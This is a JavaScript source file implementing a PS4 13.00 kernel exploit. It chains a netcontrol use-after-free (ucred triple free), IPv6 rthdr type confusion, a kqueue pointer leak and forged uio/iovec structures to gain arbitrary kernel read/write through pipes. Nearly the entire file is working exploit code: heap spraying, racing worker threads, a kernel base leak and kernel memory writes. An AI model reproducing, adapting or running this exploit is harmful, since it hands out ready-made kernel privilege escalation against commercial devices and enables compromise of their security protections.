// NetControl UAF kernel exploit (ucred triple-free -> rthdr type confusion ->
// kqueue leak -> pipe kernel R/W), ported to wobkot's engine primitives.
//
// Same kernel bug as the historical wobkot netctrl.js, but written against the
// current userland/kernel interface (fn / arw / mem / Thread / kview).
// The WebKit stage is wobkot's own (src/userland.js); this file only does
// the kernel part and sets the globals kernel.js expects (kernel_base,
// fdt_ofiles, kv) before kernel_main() continues.
//
// Supported: PS4 13.00. Offsets live in src/ps4/impl.js.

//#region Variables
const NC_NUM_ATTEMPT = 8;
const NC_NUM_IOV_WORKER = 4;
const NC_NUM_UIO_WORKER = 4;
const NC_NUM_IPV6_SOCK = 0x100;
const NC_NUM_ATTEMPT_TWINS = 0x10;
const NC_NUM_ATTEMPT_TRIPLETS = 0x10;
const NC_NUM_IOV_SPRAY = 0x100;
const NC_NUM_UIO_SPRAY = 0x100;
const NC_NUM_LEAK_KQUEUE = 5000;
const NC_KQ_HDR_MAGIC = 0x1430000;
const NC_KQ_LEAK_SIZE = 0xa0;
const NC_KQ_BATCH = 8;

const NC_NETEVENT_SET_QUEUE = 0x20000003;
const NC_NETEVENT_CLEAR_QUEUE = 0x20000007;

const NC_UIO_READ = 0;
const NC_UIO_WRITE = 1;
const NC_UIO_SYSSPACE = 1;

const NC_NUM_UIO_IOV = 0x14;
const NC_NUM_MSG_IOV = 0x17;

const nc_iov_ss = new Array(2);
const nc_uio_ss = new Array(2);
const nc_twins = new Array(2);
const nc_triplets = new Array(3);
const nc_ipv6_socks = new Array(NC_NUM_IPV6_SOCK);
const nc_iov_workers = new Array(NC_NUM_IOV_WORKER);
const nc_iov_tasks = new Array(NC_NUM_IOV_WORKER);
const nc_uio_workers = new Array(NC_NUM_UIO_WORKER);
const nc_uio_tasks = new Array(NC_NUM_UIO_WORKER);

let nc_msg = undefined;
let nc_msg_iov = undefined;
let nc_msg_uio = undefined;
let nc_uio_iov_read = undefined;
let nc_uio_iov_write = undefined;
let nc_uaf_sock = 0;
let nc_tmp = undefined;

// Syscalls not already provided by src/kernel.js or src/userland.js.
fn.netcontrol = new NativeFunction(0x63, 'number');
fn.dup = new NativeFunction(0x29, 'number');
fn.sendmsg = new NativeFunction(0x1c, 'bint');
fn.kqueue = new NativeFunction(0x16a, 'number');
//#endregion

//#region Functions
function nc_netcontrol_netevent(sock, event) {
  const size = 8;
  const addr = mem.alloc(size);
  arw.view(addr).setInt32(0, sock, true);

  if (fn.netcontrol.invoke(-1, event, addr, size) === -1) {
    throw new SyscallError(`Unable to queue ${sock} in netevent !!`);
  }

  mem.free(addr);
}

async function nc_spawn_iov_workers() {
  logger.debug('spawn iov workers...');

  await load_script('src/thread.js');

  for (let i = 0; i < nc_iov_workers.length; i++) {
    nc_iov_workers[i] = new Thread(`iov_worker_${i}`);
    await nc_iov_workers[i].init();

    await nc_iov_workers[i].execute(
      'register',
      'kinit',
      `() => {
        importScripts('kernel.js');
        pin_to_core(MAIN_CORE);
        set_rtprio(RTP);
        fn.recvmsg = new NativeFunction(0x1b, 'bint');
        return true;
      }`,
    );
    await nc_iov_workers[i].execute(
      'register',
      'recvmsg',
      `(iov_ss, msg_addr) => {
        fn.recvmsg.invoke(iov_ss[0], new BInt(msg_addr), 0);
        return true;
      }`,
    );

    await nc_iov_workers[i].execute('kinit');
  }

  logger.debug('iov workers spawned !!');
}

async function nc_spawn_uio_workers() {
  logger.debug('spawn uio workers...');

  for (let i = 0; i < nc_uio_workers.length; i++) {
    nc_uio_workers[i] = new Thread(`uio_worker_${i}`);
    await nc_uio_workers[i].init();

    await nc_uio_workers[i].execute(
      'register',
      'kinit',
      `() => {
        importScripts('kernel.js');
        pin_to_core(MAIN_CORE);
        set_rtprio(RTP);
        self.NC_UIO_IOV_NUM = ${NC_NUM_UIO_IOV};
        fn.readv = new NativeFunction(0x78, 'bint');
        fn.writev = new NativeFunction(0x79, 'bint');
        return true;
      }`,
    );
    await nc_uio_workers[i].execute(
      'register',
      'uio_read',
      `(uio_ss, read_addr) => {
        if (fn.writev.invoke(uio_ss[1], new BInt(read_addr), self.NC_UIO_IOV_NUM).eq(-1)) {
          throw new SyscallError('Unable to write vector to fd !!');
        }
        return true;
      }`,
    );
    await nc_uio_workers[i].execute(
      'register',
      'uio_write',
      `(uio_ss, write_addr) => {
        if (fn.readv.invoke(uio_ss[0], new BInt(write_addr), self.NC_UIO_IOV_NUM).eq(-1)) {
          throw new SyscallError('Unable to read vector from fd !!');
        }
        return true;
      }`,
    );

    await nc_uio_workers[i].execute('kinit');
  }

  logger.debug('uio workers spawned !!');
}

function nc_stop_iov_workers() {
  for (const worker of nc_iov_workers) {
    if (worker === undefined) continue;
    worker.terminate();
  }
}

function nc_stop_uio_workers() {
  for (const worker of nc_uio_workers) {
    if (worker === undefined) continue;
    worker.terminate();
  }
}

function nc_find_twins() {
  logger.info('Looking for twins...');

  for (let i = 0; i < NC_NUM_ATTEMPT_TWINS; i++) {
    for (let j = 0; j < nc_ipv6_socks.length; j++) {
      arw.view(spray_rthdr0_addr).setInt32(4, j, true);
      set_rthdr(nc_ipv6_socks[j]);
    }

    for (let j = 0; j < nc_ipv6_socks.length; j++) {
      get_rthdr(nc_ipv6_socks[j], ip6_rthdr0.sizeof);

      const idx = arw.view(leak_rthdr0_addr).getInt32(4, true);
      if (idx !== j) {
        logger.debug(`Found twins after ${j} iterations !!`);
        nc_twins[0] = nc_ipv6_socks[j];
        nc_twins[1] = nc_ipv6_socks[idx];
        return;
      }
    }
  }

  throw new Error('Unable to find twins !!');
}

function nc_find_triplet(master, slave) {
  for (let i = 0; i < NC_NUM_ATTEMPT_TRIPLETS; i++) {
    for (let j = 0; j < nc_ipv6_socks.length; j++) {
      if (nc_ipv6_socks[j] === master || nc_ipv6_socks[j] === slave) continue;

      arw.view(spray_rthdr0_addr).setInt32(4, j, true);
      set_rthdr(nc_ipv6_socks[j]);
    }

    get_rthdr(master, ip6_rthdr0.sizeof);

    const idx = arw.view(leak_rthdr0_addr).getInt32(4, true);
    if (nc_ipv6_socks[idx] !== master && nc_ipv6_socks[idx] !== slave) {
      logger.debug(`Found triplet after ${i} iterations !!`);
      return nc_ipv6_socks[idx];
    }
  }

  throw new Error('Unable to find triplet !!');
}

function nc_init() {
  logger.info('Environment init started...');

  pin_to_core(MAIN_CORE);
  set_rtprio(RTP);

  // Prepare spray/leak rthdr0
  spray_rthdr0_addr = mem.alloc(UCRED_SIZE);
  spray_rthdr0_len = build_rthdr(spray_rthdr0_addr, UCRED_SIZE);
  leak_rthdr0_addr = mem.alloc(UCRED_SIZE);

  // Prepare msg iov
  const msg_iov_addr = mem.alloc(nc_iovec.sizeof * NC_NUM_MSG_IOV);
  nc_msg_iov = nc_iovec.new(msg_iov_addr);
  nc_msg_uio = nc_uio.new(msg_iov_addr);

  nc_msg = nc_msghdr.new();
  nc_msg.msg_iov = nc_msg_iov.addr;
  nc_msg.msg_iovlen = NC_NUM_MSG_IOV;

  // Prepare uio iov
  const uio_iov_addr = mem.alloc(nc_iovec.sizeof * NC_NUM_UIO_IOV);
  nc_uio_iov_read = nc_iovec.new(uio_iov_addr);
  nc_uio_iov_write = nc_iovec.new(uio_iov_addr);

  const dummy_size = 0x1000;
  const dummy_addr = mem.alloc(dummy_size);
  mem.bset(dummy_addr, dummy_size, 0x41);
  nc_uio_iov_read.iov_base = dummy_addr;
  nc_uio_iov_write.iov_base = dummy_addr;

  nc_tmp = mem.alloc(PAGE_SIZE);

  logger.info('Environment init completed !!');
}

async function nc_setup() {
  logger.info('Environment setup started...');

  make_karw_pipe();

  const pair_addr = mem.alloc(8);

  // Socket pair for iov spraying
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError('Unable to create iov socket pair !!');
  }
  nc_iov_ss[0] = arw.view(pair_addr).getInt32(0, true);
  nc_iov_ss[1] = arw.view(pair_addr).getInt32(4, true);

  // Socket pair for uio spraying
  if (fn.socketpair.invoke(AF_UNIX, SOCK_STREAM, 0, pair_addr) === -1) {
    throw new SyscallError('Unable to create uio socket pair !!');
  }
  nc_uio_ss[0] = arw.view(pair_addr).getInt32(0, true);
  nc_uio_ss[1] = arw.view(pair_addr).getInt32(4, true);

  mem.free(pair_addr);

  // Sockets for spraying and pktopts initialization
  for (let i = 0; i < nc_ipv6_socks.length; i++) {
    nc_ipv6_socks[i] = make_socket(AF_INET6, SOCK_STREAM);
  }

  await nc_spawn_iov_workers();
  await nc_spawn_uio_workers();

  logger.info('Environment setup completed !!');
}

function nc_cleanup() {
  logger.info('Environment cleanup started...');

  if (nc_uaf_sock !== 0) {
    if (fn.close.invoke(nc_uaf_sock) === -1) {
      throw new SyscallError(`Unable to close fd ${nc_uaf_sock} !!`);
    }
    nc_uaf_sock = 0;
  }

  for (const sock of nc_iov_ss) {
    if (sock === 0 || sock === undefined) continue;
    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of nc_uio_ss) {
    if (sock === 0 || sock === undefined) continue;
    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  for (const sock of nc_ipv6_socks) {
    if (sock === 0 || sock === undefined) continue;
    if (fn.close.invoke(sock) === -1) {
      throw new SyscallError(`Unable to close fd ${sock} !!`);
    }
  }

  free_karw_pipe();
  nc_stop_iov_workers();
  nc_stop_uio_workers();

  if (nc_msg_iov !== undefined) mem.free(nc_msg_iov.addr);
  if (nc_msg_uio !== undefined) mem.free(nc_msg_uio.addr);
  if (nc_msg !== undefined) mem.free(nc_msg.addr);
  if (nc_tmp !== undefined) mem.free(nc_tmp);
  if (spray_rthdr0_addr !== undefined) mem.free(spray_rthdr0_addr);
  if (leak_rthdr0_addr !== undefined) mem.free(leak_rthdr0_addr);

  logger.info('Environment cleanup completed !!');
}

async function nc_ucred_triple_free() {
  logger.info('Ucred double free started...');

  // iov_base of 1 is read as cr_refcnt when the chunk is reclaimed as ucred.
  nc_msg_iov.iov_base = 1;
  nc_msg_iov.iov_len = 1;

  const msg_addr = nc_msg.addr.toString();

  for (let i = 0; i < NC_NUM_ATTEMPT; i++) {
    try {
      // Register a dummy socket, close it, then reclaim its fd with a fresh
      // ucred. CLEAR_QUEUE frees the file/ucred while the fd still refers to it.
      const dummy_sock = make_socket(AF_UNIX, SOCK_STREAM);
      nc_netcontrol_netevent(dummy_sock, NC_NETEVENT_SET_QUEUE);

      if (fn.close.invoke(dummy_sock) === -1) {
        throw new SyscallError(`Unable to close fd ${dummy_sock} !!`);
      }
      if (fn.setuid.invoke(1) === -1) {
        throw new SyscallError('Unable to set uid to 1 !!');
      }

      nc_uaf_sock = make_socket(AF_UNIX, SOCK_STREAM);
      if (nc_uaf_sock !== dummy_sock) {
        throw new Error(`Unable to reclaim fd ${dummy_sock} !!`);
      }

      if (fn.setuid.invoke(1) === -1) {
        throw new SyscallError('Unable to set uid to 1 !!');
      }
      nc_netcontrol_netevent(nc_uaf_sock, NC_NETEVENT_CLEAR_QUEUE);

      // Set cr_refcnt back to 1 with iov spray.
      for (let j = 0; j < 0x80; j++) {
        fn.sendmsg.invoke(0, nc_msg.addr, 0);
      }

      // Double free ucred (dup is the only op that does not check fhold).
      let dup = fn.dup.invoke(nc_uaf_sock);
      if (dup === -1) throw new SyscallError('Unable to duplicate uaf_sock !!');
      if (fn.close.invoke(dup) === -1) throw new SyscallError('Unable to close dup fd !!');

      nc_find_twins();
      logger.info(`Found twins: ${nc_twins} !!`);
      logger.info('Ucred double free achieved !!');

      logger.info('Ucred triple free started...');

      // Free one of the twins, then drive cr_refcnt back to 1 with the
      // parked recvmsg racers so the second dup gives a triple free.
      free_rthdr(nc_twins[1]);

      let reclaimed = false;
      for (let j = 0; j < NC_NUM_IOV_SPRAY; j++) {
        for (let k = 0; k < nc_iov_tasks.length; k++) {
          nc_iov_tasks[k] = nc_iov_workers[k].execute('recvmsg', nc_iov_ss, msg_addr);
        }

        if (fn.sched_yield.invoke() === -1) {
          throw new SyscallError('Unable to yield scheduler !!');
        }

        get_rthdr(nc_twins[0], ip6_rthdr0.sizeof);
        if (arw.view(leak_rthdr0_addr).getInt32(0, true) === 1) {
          reclaimed = true;
          break;
        }

        // Release iov spray.
        if (fn.write.invoke(nc_iov_ss[1], nc_tmp, 1).eq(-1)) {
          throw new SyscallError('Unable to write to iov fd !!');
        }
        await Promise.all(nc_iov_tasks);
        if (fn.read.invoke(nc_iov_ss[0], nc_tmp, 1).eq(-1)) {
          throw new SyscallError('Unable to read from iov fd !!');
        }
      }

      if (!reclaimed) throw new Error('Unable to set cr_refcnt back to 1 !!');
      logger.info('Set cr_refcnt back to 1 !!');

      // Triple free.
      dup = fn.dup.invoke(nc_uaf_sock);
      if (dup === -1) throw new SyscallError('Unable to duplicate uaf_sock (2) !!');
      if (fn.close.invoke(dup) === -1) throw new SyscallError('Unable to close dup fd (2) !!');

      nc_triplets[0] = nc_twins[0];
      nc_triplets[1] = nc_find_triplet(nc_triplets[0], -1);

      if (fn.write.invoke(nc_iov_ss[1], nc_tmp, 1).eq(-1)) {
        throw new SyscallError('Unable to write to iov fd !!');
      }
      nc_triplets[2] = nc_find_triplet(nc_triplets[0], nc_triplets[1]);

      await Promise.all(nc_iov_tasks);
      if (fn.read.invoke(nc_iov_ss[0], nc_tmp, 1).eq(-1)) {
        throw new SyscallError('Unable to read from iov fd !!');
      }

      logger.info(`Found triplet: ${nc_triplets} !!`);
      logger.info('Ucred triple free achieved !!');
      break;
    } catch (err) {
      if (err.name === 'SyscallError') throw err;

      logger.info(`[${i + 1}/${NC_NUM_ATTEMPT}] ${err.message}\n${err.stack}`);

      if (i + 1 === NC_NUM_ATTEMPT) {
        throw new Error('Unable to ucred triple free !!');
      }

      logger.info('Reattempt...');
      if (nc_uaf_sock !== 0) {
        if (fn.close.invoke(nc_uaf_sock) === -1) {
          throw new SyscallError(`Unable to close fd ${nc_uaf_sock} !!`);
        }
        nc_uaf_sock = 0;
      }
    }
  }
}

function nc_leak_kqueue() {
  logger.info('Leak kqueue started...');

  free_rthdr(nc_triplets[2]);

  const held = [];
  const close_held = (keep) => {
    while (held.length > 0) {
      const fd = held.pop();
      if (fd === keep) continue;

      if (fn.close.invoke(fd) === -1) {
        throw new SyscallError(`Unable to close kqueue fd ${fd} !!`);
      }
    }
  };

  let kq = -1;
  let leaked = false;
  let magic_no_fdp = 0;

  for (let i = 0; i < NC_NUM_LEAK_KQUEUE; i++) {
    const fd = fn.kqueue.invoke();
    if (fd === -1) {
      close_held(-1);
      continue;
    }

    held.push(fd);
    kq = fd;

    let got = 0;
    try {
      got = get_rthdr(nc_triplets[0], NC_KQ_LEAK_SIZE);
    } catch (err) {
      got = 0;
    }

    const view = arw.view(leak_rthdr0_addr);
    const magic_ok = got >= NC_KQ_LEAK_SIZE
      && view.getUint32(8, true) === NC_KQ_HDR_MAGIC
      && view.getUint32(12, true) === 0;
    const kq_fdp = view.getBInt(0x98, true);

    // The magic alone is not enough: it can appear before the fdp pointer is
    // filled in. The verified chain rejects those and keeps trying.
    if (magic_ok && kq_fdp.neq(0)) {
      logger.debug(`Leaked kqueue after ${i} iterations !!`);
      leaked = true;
      break;
    }

    if (magic_ok) magic_no_fdp++;

    if (held.length >= NC_KQ_BATCH) {
      close_held(-1);
    }
  }

  if (!leaked) {
    close_held(-1);
    throw new Error(`Unable to leak kqueue (magic without kq_fdp: ${magic_no_fdp}) !!`);
  }

  // Keep the leaked kqueue alive until its header has been read.
  close_held(kq);

  logger.info('Leaked kqueue !!');

  const view = arw.view(leak_rthdr0_addr);
  const kl_lock = view.getBInt(0x60, true);
  const kq_fdp = view.getBInt(0x98, true);
  kernel_base = kl_lock.sub(impl.k_kl_lock);

  logger.debug(`kl_lock: ${kl_lock}`);
  logger.debug(`kq_fdp: ${kq_fdp}`);
  logger.info(`kernel base: ${kernel_base}`);

  if (fn.close.invoke(kq) === -1) {
    throw new SyscallError(`Unable to close kqueue fd ${kq} !!`);
  }

  nc_triplets[2] = nc_find_triplet(nc_triplets[0], nc_triplets[1]);

  logger.info('Leak kqueue completed !!');
}

async function nc_kread_slow(addr, size) {
  const leak_bufs = new Array(nc_uio_workers.length);
  for (let i = 0; i < leak_bufs.length; i++) {
    leak_bufs[i] = mem.alloc(size);
  }

  // Set socket send buffer size.
  const buf_size_addr = mem.alloc(4);
  arw.view(buf_size_addr).setInt32(0, size, true);
  if (fn.setsockopt.invoke(nc_uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
    throw new SyscallError('Unable to set socket option !!');
  }
  mem.free(buf_size_addr);

  if (fn.write.invoke(nc_uio_ss[1], nc_tmp, size).eq(-1)) {
    throw new SyscallError('Unable to write to uio fd !!');
  }

  nc_uio_iov_read.iov_len = size;

  free_rthdr(nc_triplets[2]);

  let reclaimed = false;
  for (let i = 0; i < NC_NUM_UIO_SPRAY; i++) {
    for (let k = 0; k < nc_uio_tasks.length; k++) {
      nc_uio_tasks[k] = nc_uio_workers[k].execute(
        'uio_read',
        nc_uio_ss,
        nc_uio_iov_read.addr.toString(),
      );
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError('Unable to yield scheduler !!');
    }

    get_rthdr(nc_triplets[0], nc_iovec.sizeof);
    if (arw.view(leak_rthdr0_addr).getInt32(8, true) === NC_NUM_UIO_IOV) {
      reclaimed = true;
      break;
    }

    if (fn.read.invoke(nc_uio_ss[0], nc_tmp, size).eq(-1)) {
      throw new SyscallError('Unable to read from uio fd !!');
    }
    for (let k = 0; k < leak_bufs.length; k++) {
      if (fn.read.invoke(nc_uio_ss[0], leak_bufs[k], size).eq(-1)) {
        throw new SyscallError('Unable to read from uio fd (leak) !!');
      }
    }
    await Promise.all(nc_uio_tasks);

    if (fn.write.invoke(nc_uio_ss[1], nc_tmp, size).eq(-1)) {
      throw new SyscallError('Unable to write to uio fd (refill) !!');
    }
  }

  if (!reclaimed) throw new Error('Unable to reclaim with uio !!');

  const uio_iov = arw.view(leak_rthdr0_addr).getBInt(0, true);

  // Forge a uio that reads from the requested kernel address.
  nc_msg_uio.uio_iov = uio_iov;
  nc_msg_uio.uio_iovcnt = NC_NUM_UIO_IOV;
  nc_msg_uio.uio_offset = -1;
  nc_msg_uio.uio_resid = nc_uio_iov_read.iov_len;
  nc_msg_uio.uio_segflg = NC_UIO_SYSSPACE;
  nc_msg_uio.uio_rw = NC_UIO_WRITE;
  nc_msg_uio.uio_td = 0;

  nc_msg_iov[3].iov_base = addr;
  nc_msg_iov[3].iov_len = nc_uio_iov_read.iov_len;

  free_rthdr(nc_triplets[1]);

  const msg_addr = nc_msg.addr.toString();
  reclaimed = false;
  for (let i = 0; i < NC_NUM_IOV_SPRAY; i++) {
    for (let k = 0; k < nc_iov_tasks.length; k++) {
      nc_iov_tasks[k] = nc_iov_workers[k].execute('recvmsg', nc_iov_ss, msg_addr);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError('Unable to yield scheduler !!');
    }

    get_rthdr(nc_triplets[0], nc_uio.sizeof + nc_iovec.sizeof);
    if (arw.view(leak_rthdr0_addr).getInt32(0x20, true) === NC_UIO_SYSSPACE) {
      reclaimed = true;
      break;
    }

    if (fn.write.invoke(nc_iov_ss[1], nc_tmp, 1).eq(-1)) {
      throw new SyscallError('Unable to write to iov fd !!');
    }
    await Promise.all(nc_iov_tasks);
    if (fn.read.invoke(nc_iov_ss[0], nc_tmp, 1).eq(-1)) {
      throw new SyscallError('Unable to read from iov fd !!');
    }
  }

  if (!reclaimed) throw new Error('Unable to reclaim uio with iov !!');

  if (fn.read.invoke(nc_uio_ss[0], nc_tmp, size).eq(-1)) {
    throw new SyscallError('Unable to read from uio fd (wake) !!');
  }

  const spray_val = new BInt('0x4141414141414141');
  let leak_buf;
  for (let i = 0; i < leak_bufs.length; i++) {
    if (fn.read.invoke(nc_uio_ss[0], leak_bufs[i], size).eq(-1)) {
      throw new SyscallError('Unable to read from uio fd (result) !!');
    }

    if (arw.view(leak_bufs[i]).getBInt(0, true).neq(spray_val)) {
      nc_triplets[1] = nc_find_triplet(nc_triplets[0], -1);
      leak_buf = leak_bufs[i];
      continue;
    }

    mem.free(leak_bufs[i]);
  }
  await Promise.all(nc_uio_tasks);

  if (fn.write.invoke(nc_iov_ss[1], nc_tmp, 1).eq(-1)) {
    throw new SyscallError('Unable to write to iov fd (release) !!');
  }
  nc_triplets[2] = nc_find_triplet(nc_triplets[0], nc_triplets[1]);
  await Promise.all(nc_iov_tasks);
  if (fn.read.invoke(nc_iov_ss[0], nc_tmp, 1).eq(-1)) {
    throw new SyscallError('Unable to read from iov fd (release) !!');
  }

  if (leak_buf === undefined) throw new Error(`Unable to kread ${addr} !!`);

  return leak_buf;
}

async function nc_kwrite_slow(dst, src, size) {
  const buf_size_addr = mem.alloc(4);
  arw.view(buf_size_addr).setInt32(0, size, true);
  if (fn.setsockopt.invoke(nc_uio_ss[1], SOL_SOCKET, SO_SNDBUF, buf_size_addr, 4) === -1) {
    throw new SyscallError('Unable to set socket option !!');
  }
  mem.free(buf_size_addr);

  nc_uio_iov_write.iov_len = size;

  free_rthdr(nc_triplets[2]);

  let reclaimed = false;
  for (let i = 0; i < NC_NUM_UIO_SPRAY; i++) {
    for (let k = 0; k < nc_uio_tasks.length; k++) {
      nc_uio_tasks[k] = nc_uio_workers[k].execute(
        'uio_write',
        nc_uio_ss,
        nc_uio_iov_write.addr.toString(),
      );
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError('Unable to yield scheduler !!');
    }

    get_rthdr(nc_triplets[0], nc_iovec.sizeof);
    if (arw.view(leak_rthdr0_addr).getInt32(8, true) === NC_NUM_UIO_IOV) {
      reclaimed = true;
      break;
    }

    for (let k = 0; k < nc_uio_workers.length; k++) {
      if (fn.write.invoke(nc_uio_ss[1], src, size).eq(-1)) {
        throw new SyscallError('Unable to write to uio fd !!');
      }
    }
    await Promise.all(nc_uio_tasks);
  }

  if (!reclaimed) throw new Error('Unable to reclaim with uio (write) !!');

  const uio_iov = arw.view(leak_rthdr0_addr).getBInt(0, true);

  nc_msg_uio.uio_iov = uio_iov;
  nc_msg_uio.uio_iovcnt = NC_NUM_UIO_IOV;
  nc_msg_uio.uio_offset = -1;
  nc_msg_uio.uio_resid = nc_uio_iov_write.iov_len;
  nc_msg_uio.uio_segflg = NC_UIO_SYSSPACE;
  nc_msg_uio.uio_rw = NC_UIO_READ;
  nc_msg_uio.uio_td = 0;

  nc_msg_iov[3].iov_base = dst;
  nc_msg_iov[3].iov_len = nc_uio_iov_write.iov_len;

  free_rthdr(nc_triplets[1]);

  const msg_addr = nc_msg.addr.toString();
  reclaimed = false;
  for (let i = 0; i < NC_NUM_IOV_SPRAY; i++) {
    for (let k = 0; k < nc_iov_tasks.length; k++) {
      nc_iov_tasks[k] = nc_iov_workers[k].execute('recvmsg', nc_iov_ss, msg_addr);
    }

    if (fn.sched_yield.invoke() === -1) {
      throw new SyscallError('Unable to yield scheduler !!');
    }

    get_rthdr(nc_triplets[0], nc_uio.sizeof + nc_iovec.sizeof);
    if (arw.view(leak_rthdr0_addr).getInt32(0x20, true) === NC_UIO_SYSSPACE) {
      reclaimed = true;
      break;
    }

    if (fn.write.invoke(nc_iov_ss[1], nc_tmp, 1).eq(-1)) {
      throw new SyscallError('Unable to write to iov fd !!');
    }
    await Promise.all(nc_iov_tasks);
    if (fn.read.invoke(nc_iov_ss[0], nc_tmp, 1).eq(-1)) {
      throw new SyscallError('Unable to read from iov fd !!');
    }
  }

  if (!reclaimed) throw new Error('Unable to reclaim uio with iov (write) !!');

  for (let k = 0; k < nc_uio_workers.length; k++) {
    if (fn.write.invoke(nc_uio_ss[1], src, size).eq(-1)) {
      throw new SyscallError('Unable to write to uio fd (corrupt) !!');
    }
  }

  nc_triplets[1] = nc_find_triplet(nc_triplets[0], -1);
  await Promise.all(nc_uio_tasks);

  if (fn.write.invoke(nc_iov_ss[1], nc_tmp, 1).eq(-1)) {
    throw new SyscallError('Unable to write to iov fd (release) !!');
  }
  nc_triplets[2] = nc_find_triplet(nc_triplets[0], nc_triplets[1]);
  await Promise.all(nc_iov_tasks);
  if (fn.read.invoke(nc_iov_ss[0], nc_tmp, 1).eq(-1)) {
    throw new SyscallError('Unable to read from iov fd (release) !!');
  }
}

async function nc_kread8_slow(addr) {
  const leak_buf = await nc_kread_slow(addr, 8);
  return arw.view(leak_buf).getBInt(0, true);
}

function nc_remove_uaf_file() {
  const uaf_fp = fget(nc_uaf_sock);
  logger.debug(`uaf_fp: ${uaf_fp}`);

  fput(nc_uaf_sock, 0);
  nc_uaf_sock = 0;

  let removed = 0;
  for (let i = 0; i < 0x100; i++) {
    const sock = make_socket(AF_UNIX, SOCK_STREAM);

    if (fget(sock).eq(uaf_fp)) {
      logger.debug(`reclaimed uaf fp with fd ${sock}, removing...`);
      fput(sock, 0);
      removed++;
    }

    fn.close.invoke(sock);
    if (removed === 3) {
      logger.info(`cleaned up uaf fp after ${i} iterations !!`);
      break;
    }
  }
}

async function nc_make_karw() {
  logger.info('Initiate kernel ARW...');

  fdt_ofiles = await nc_kread8_slow(kq_fdp);
  logger.debug(`fdt_ofiles: ${fdt_ofiles}`);

  const master_fp = await nc_kread8_slow(fdt_ofiles.add(master_pipe[0] * k_filedesc_sizeof));
  const slave_fp = await nc_kread8_slow(fdt_ofiles.add(victim_pipe[0] * k_filedesc_sizeof));
  const master_data = await nc_kread8_slow(master_fp);
  const slave_data = await nc_kread8_slow(slave_fp);

  const pipe_buf = pipebuf.new();
  pipe_buf.cnt = 0;
  pipe_buf.in = 0;
  pipe_buf.out = 0;
  pipe_buf.size = PAGE_SIZE;
  pipe_buf.buffer = slave_data;

  await nc_kwrite_slow(master_data, pipe_buf.addr, pipebuf.sizeof);
  mem.free(pipe_buf.addr);

  kv = new KernelView(master_pipe, victim_pipe);

  logger.info('Achieved kernel ARW !!');
}

async function exploit_main() {
  logger.info('===NETCTRL===');

  try {
    nc_init();
    await nc_setup();
    await nc_ucred_triple_free();
    nc_leak_kqueue();
    await nc_make_karw();

    inc_karw_pipe_refcnt();

    // Remove rthdr pointers from the triplets and the triple-freed file.
    for (const triplet of nc_triplets) {
      remove_rthdr_from_so(triplet);
    }
    nc_remove_uaf_file();
  } finally {
    try {
      nc_cleanup();
    } catch (cleanup_err) {
      logger.error(`Unable to cleanup: ${cleanup_err}`);
    }
  }

  logger.info('===END===');
}
//#endregion

//#region Structs
const nc_iovec = new Struct('nc_iovec', [
  { type: 'Uint64', name: 'iov_base' },
  { type: 'Uint64', name: 'iov_len' },
]);

const nc_msghdr = new Struct('nc_msghdr', [
  { type: 'Uint64', name: 'msg_name' },
  { type: 'Uint32', name: 'msg_namelen' },
  { type: 'nc_iovec*', name: 'msg_iov' },
  { type: 'Int32', name: 'msg_iovlen' },
  { type: 'Uint64', name: 'msg_control' },
  { type: 'Uint32', name: 'msg_controllen' },
  { type: 'Int32', name: 'msg_flags' },
]);

const nc_uio = new Struct('nc_uio', [
  { type: 'Uint64', name: 'uio_iov' },
  { type: 'Uint32', name: 'uio_iovcnt' },
  { type: 'Uint64', name: 'uio_offset' },
  { type: 'Uint64', name: 'uio_resid' },
  { type: 'Uint32', name: 'uio_segflg' },
  { type: 'Uint32', name: 'uio_rw' },
  { type: 'Uint64', name: 'uio_td' },
]);
//#endregion
